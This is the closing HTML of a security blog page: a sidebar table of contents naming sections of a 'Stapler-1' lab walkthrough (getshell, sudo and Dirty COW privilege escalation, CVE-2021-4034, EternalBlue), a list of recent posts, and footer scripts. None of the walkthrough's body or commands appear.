class="toc-text">Stapler-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">1.3.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.1.</span> <span class="toc-text">sudo提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.2.</span> <span class="toc-text">脏牛提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-4034"><span class="toc-number">1.4.3.</span> <span class="toc-text">CVE-2021-4034</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%BD%95"><span class="toc-number">1.5.</span> <span class="toc-text">附录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#awk%E6%8B%86%E5%88%86"><span class="toc-number">1.5.1.</span> <span class="toc-text">awk拆分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="toc-number">1.5.2.</span> <span class="toc-text">smb-永恒之蓝</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss-labs/" title="xss-labs">xss-labs</a><time datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss/" title="XSS">XSS</a><time datetime="2025-07-26T14:35:45.178Z" title="Updated 2025-07-26 22:35:45">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/jarbas-1/" title="jarbas-1">jarbas-1</a><time datetime="2025-07-26T14:13:02.073Z" title="Updated 2025-07-26 22:13:02">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/vulnstack-5/" title="VulnStack-红日5">VulnStack-红日5</a><time datetime="2025-07-26T13:23:05.723Z" title="Updated 2025-07-26 21:23:05">2025-07-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
